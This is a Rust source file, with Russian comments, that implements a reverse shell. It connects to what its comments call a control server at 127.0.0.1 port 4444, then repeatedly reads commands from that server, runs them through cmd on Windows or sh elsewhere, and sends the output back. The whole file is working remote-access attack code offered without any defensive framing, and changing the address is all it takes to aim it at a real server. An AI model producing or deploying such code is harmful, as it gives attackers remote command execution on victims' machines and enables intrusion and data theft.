use std::net::{TcpStream};
use std::process::{Command, Stdio};
use std::io::{self, Read, Write};
use std::str;
fn main() {
    let remote_ip = "127.0.0.1"; // IP-адрес управляющего сервера
    let port = "4444"; // Порт управляющего сервера
    match TcpStream::connect(format!("{}:{}", remote_ip, port)) {
        Ok(mut stream) => {
            println!("Успешно подключено к {}:{}", remote_ip, port);
            
            loop {
                let mut command = String::new();
                let mut buffer = [0; 1024];
                // Читаем команду от сервера
                match stream.read(&mut buffer) {
                    Ok(size) => {
                        command.push_str(str::from_utf8(&buffer[..size]).unwrap());
                    },
                    Err(e) => {
                        println!("Ошибка при чтении команды: {}", e);
                        return;
                    }
                };
                if command.is_empty() {
                    continue;
                }
                println!("Выполняется команда: {}", command);
                // Обрабатываем команду выполнения
                let output = if cfg!(target_os = "windows") {
                    Command::new("cmd")
                        .args(&["/C", &command])
                        .stdout(Stdio::piped())
                        .stderr(Stdio::piped())
                        .output()
                } else {
                    Command::new("sh")
                        .arg("-c")
                        .arg(&command)
                        .stdout(Stdio::piped())
                        .stderr(Stdio::piped())
                        .output()
                };
                // Отправляем результат обратно на сервер
                match output {
                    Ok(output) => {
                        if let Err(e) = stream.write(&output.stdout) {
                            println!("Ошибка при отправке stdout: {}", e);
                        }
                        if let Err(e) = stream.write(&output.stderr) {
                            println!("Ошибка при отправке stderr: {}", e);
                        }
                    }
                    Err(e) => {
                        let err_msg = format!("Ошибка при выполнении команды: {}", e);
                        if let Err(e) = stream.write(err_msg.as_bytes()) {
                            println!("Ошибка при отправке сообщения об ошибке: {}", e);
                        }
                    }
                }
            }
        },
        Err(e) => {
            println!("Не удалось подключиться: {}", e);
        }
    }
} 
